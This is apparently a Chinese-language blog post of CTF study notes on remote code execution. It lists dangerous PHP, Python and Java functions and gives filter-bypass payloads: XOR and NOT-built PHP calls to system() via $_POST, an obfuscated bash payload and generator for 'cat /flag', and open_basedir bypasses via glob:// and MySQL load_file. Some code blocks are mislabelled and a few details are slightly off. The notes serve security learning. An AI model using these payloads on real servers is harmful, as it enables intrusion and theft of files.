---
title: RCE执行
published: 2025-03-09 16:44:04
tags: [WEB安全,通用漏洞]
category: 安全
draft: false
---

# RCE执行

## 漏洞函数

### PHP

- `eval()`
- `exec()`
- `system()`
- `shell_exec()`
- `passthru()`
- `popen()`
- `proc_open()`
- `pcntl_exec()`

### Python

- `eval()`
- `exec()`
- `os.system()`
- `subprocess.Popen()`
- `subprocess.call()`
- `subprocess.run()`

### Java

- `Runtime.exec()`
- `ProcessBuilder.start()`
- `ScriptEngine.eval()`

### 白盒思路

搜索特定函数或功能点，RCE 通常通过搜索特定函数来实现。

### 过滤字符

- 空格：`${IFS}`、`$IFS$9`、`<`、`<>`、`{,}`

## 无参 & 无数字 RCE

> https://xz.aliyun.com/news/11688
> 

> https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/
> 

> https://xz.aliyun.com/news/11375
> 

> https://www.cnblogs.com/LLeaves/p/13210005.html
> 

> https://blog.csdn.net/qq_38154820/article/details/107171940
> 

### 无参 RCE

- **localeconv()**
    - `localeconv()` 返回包含本地数字及货币格式信息的数组，数组第一项是 `"."`。
    - 使用 `current()` 或 `pos()` 获取数组第一个值：
        
        ```python
        print_r(current(localeconv())); // 输出 .print_r(scandir(current(localeconv()))); // 读取当前目录并打印
        ```
        
    - 如果 `current()` 被过滤，可以使用 `reset()`，返回数组第一个单元的值。
- **读取本地目录文件**
    - `current()`：返回数组中的当前单元。
    - `each()`：返回数组中当前的键/值对并将数组指针向前移动一步。
    - `end()`：将数组的内部指针指向最后一个单元。
    - `next()`：将数组中的内部指针向前移动一位。
    - `prev()`：将数组的内部指针倒回一位。
    - `show_source`、`readfile`、`highlight_file`、`file_get_contents` 等读文件函数。
    - `array_reverse()`：以相反的元素顺序返回数组。
    - 读取数组最后一个文件内容：
        
        ```python
        print_r(readfile(end(scandir(getcwd()))));
        ```
        

### 无数字字母 RCE

当我们想得到`a-z`中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的或结果是这个字母即可

在php中，两个字符进行异或时，会先将字符串转换成ascii码值，再将这个值转换成二进制，然后一位一位的进行按位异或

异或的规则是：`1^1=0,1^0=1,0^1=1,0^0=0`

或的规则是：`1^1=1,1^0=1,0^1=1,0^0=0`

1. **取反**
    
    ```python
    $a = urlencode(~'phpinfo'); // 取反
    echo $a;echo ~urldecode($a); // 再取反
    // %8F%97%8F%96%91%99%90 phpinfo
    // payload: (~%8F%97%8F%96%91%99%90)();
    ```
    
2. **异或**
    - 通过两个非字母数字字符的异或得到目标字母。
    - 例如，构造字母 `a`：
        
        ```python
        $a = '@' ^ '!'; // 结果为 a
        ```
        
3. **或**
    - 通过两个非字母数字字符的或运算得到目标字母。
    - 例如，构造字母 `s`：
        
        ```python
        $s = 'DC3' | '`'; // 结果为 s
        ```
        

### 异或/或 便于理解

在 PHP 中，`$$` 是可变变量的一种形式。`$$` 的用法是将一个变量的值作为另一个变量的名字来访问。

1. **解码 `$_POST` 字符串**：
    
    ```python
    $__ = ("#" ^ "|"); // 结果是 _
    $__ .= ("." ^ "~"); // 结果是 _P
    $__ .= ("/" ^ "`"); // 结果是 _PO
    $__ .= ("|" ^ "/"); // 结果是 _POS
    $__ .= ("{" ^ "/"); // 结果是 _POST
    ```
    
2. **可变变量：`$$__`**
    - `$__` 的值是 `"_POST"`，因此 `$$__` 实际上是指 `$_POST`。
3. **进一步分析 `$$__[_]($$__[__])`**
    - 等价于 `$_POST[_]($_POST[__])`。
    - 动态调用 `$_POST[_]` 中的函数，并传入 `$_POST[__]` 作为参数。
4. **总结攻击手法**：
    - 通过 POST 请求执行任意代码，例如：
        
        ```python
        $_POST['_'] = 'system'; // 动态调用 system() 函数$_POST['__'] = 'ls'; // system 函数执行的命令
        ```
        

### **bashshell** 无字母无数字执行

> https://xz.aliyun.com/t/12242
> 

| **变量名** | **含义** |
| --- | --- |
| $0 | 脚本本身的名字 |
| $1 | 脚本后所输入的第一串字符 |
| $2 | 传递给该 shell 脚本的第二个参数 |
| $* | 脚本后所输入的所有字符 |
| $@ | 脚本后所输入的所有字符 |
| $_ | 表示上一个命令的最后一个参数 |
| $# | 脚本后所输入的字符串个数 |
| $$ | 脚本运行的当前进程 ID 号 |
| $! | 表示最后执行的后台命令的 PID |
| $? | 显示最后命令的退出状态，0 表示没有错误，其他表示有错误 |

在终端中，`$'\xxx'` 可以将八进制 ASCII 码解析为字符。

```python
# ls 就是$'\154\163'
```

此外，在 bash 中可以使用 `[base#]n` 的方式表示数字，例如 `2#100` 表示十进制数字 4。

```python
echo $((2#100))
```

使用位移运算 `1<<1` 代替 `2`，只用到 0 和 1 就能构造 payload。

```python
$0<<<$'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\' // 相当于 $'\154\163'
```

构造 `cat /flag` 的 payload：

```python
__=${#};${!__}<<<${!__}\<\<\<\$\'\\$(($((${##}<<${##}))#${##}${#}${#}${#}${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}${#}${#}${#}${##}${##}${#}${##}))\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${##}${#}${#}))\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${#}))\\$(($((${##}<<${##}))#${##}${##}${##}${#}${#}${##}))\\$(($((${##}<<${##}))#${##}${#}${#}${##}${#}${#}${##}${#}))\\$(($((${##}<<${##}))#${##}${#}${#}${##}${##}${#}${##}${#}))\\$(($((${##}<<${##}))#${##}${#}${#}${#}${##}${##}${#}${##}))\\$(($((${##}<<${##}))#${##}${#}${#}${##}${#}${#}${##}${##}))\'
```

使用脚本构造：

```python
cmd='cat /flag'
payload='__=${#};${!__}<<<${!__}\\<\\<\\<\\$\\\''
for c in cmd:    
	payload+=f'\\\\$(($((1<<1))#{bin(int(oct(ord(c))[2:]))[2:]}))'.replace('1','${##}').replace('0','${#}')
	payload+='\\\''
print(payload)
```

> 整个表达式 bin(int(oct(ord(c))[2:]))[2:] 的作用是：
> 
> 1. 取字符 `c` 的 ASCII 值。
> 2. 将其转换为八进制。
> 3. 去掉八进制字符串的前缀 `0o`。
> 4. 将八进制字符串再转换回十进制整数。
> 5. 将该整数转换为二进制表示。
> 6. 去掉二进制表示中的前缀 `0b`，得到纯二进制字符串。

### 通过 `$(())` 构造

通过 `$(())` 操作构造出 36：

```python
get_reverse_number = "$((~$(({}))))" # 取反操作
negative_one = "$((~$(())))"        # -1
payload = get_reverse_number.format(negative_one*37)
print(payload)
```

> 通过$(())操作构造出36： $(()) ：代表做一次运算，因为里面为空，也表示值为0
> 

> $(( ~$(()) )) ：对0作取反运算，值为-1
> 

> $(( $((~$(()))) $((~$(()))) ))： -1-1，也就是(-1)+(-1)为-2，所以值为-2
> 

> $(( ~$(( $((~$(()))) $((~$(()))) )) )) ：再对-2做一次取反得到1，所以值为1
> 

> 故我们在$(( ~$(( )) ))里面放37个$((~$(())))，得到-37，取反即可得到36
> 

### 临时文件上传无数字字母 RCE

> https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html
> 

### 利用 bash 内置变量进行命令执行

> [https://www.freebuf.com/articles/web/321865.html](https://www.freebuf.com/articles/web/321865.html)
> 

```python
$PWD
// 用途：工作目录（你当前所在的目录），例如：echo $PWD

$RANDOM
// 用途：产生随机整数，范围在 0 - 32767 之间。

$SHLVL
// 用途：SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器，默认初始值为 1。

$USER
// 用途：获取当前用户名。

$PHP_VERSION
// 用途：获取当前 PHP 版本。

$OLDPWD
// 用途：表示前一个工作目录。

$HOME
// 用途：用户的 home 目录，一般是 /home/username。

$HOSTNAME
// 用途：主机名称。

IFS
// 用途：内部域分隔符，决定 Bash 在解释字符串时如何识别域或单词边界。

BASH
// 用途：Bash 的二进制程序文件的路径。

$BASH_VERSION
// 用途：系统上安装的 Bash 版本号。

${BASH:~${#SHLVL}:${#SHLVL}}
// 用途：倒数第二个开始取一个字符。

$?
// 用途：表示上一条命令执行结束后的传回值，0 代表执行成功，非 0 代表执行有误。
```

## open_basedir 绕过

`open_basedir` 是 php.ini 中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域。

假设`open_basedir=/home/wwwroot/home/web1/:/tmp/`，那么通过web1访问服务器的 用户就无法获取服务器上除了`/home/wwwroot/home/web1/`和`/tmp/`这两个目录以外的文件

### glob 绕过

**利用 DirectoryIterator + glob://**

`DirectoryIterator` 类提供了一个简单的界面来查看文件系统目录的内容。

```python
<?php
$c = $_GET['c'];
$a = new DirectoryIterator($c);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
```

CTFshow web72 获取根目录：

```python
c=$a = new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString().'<br>');};exit();
```

### **`opendir`、`readdir` 和 `closedir` 函数**

```python
<?php
$arrFiles = array();
$handle = opendir('/path/to/directory');
 
if ($handle) {
    while (($entry = readdir($handle)) !== FALSE) {
        $arrFiles[] = $entry;
    }
}
 
closedir($handle);
```

### mysql load_file

```python
c=$con = mysqli_connect('127.0.0.1','root','root');$result = mysqli_query($con,"SELECT load_file('/flag36.txt')"); while ($row = mysqli_fetch_assoc($result)){var_export($row);};exit();
```

---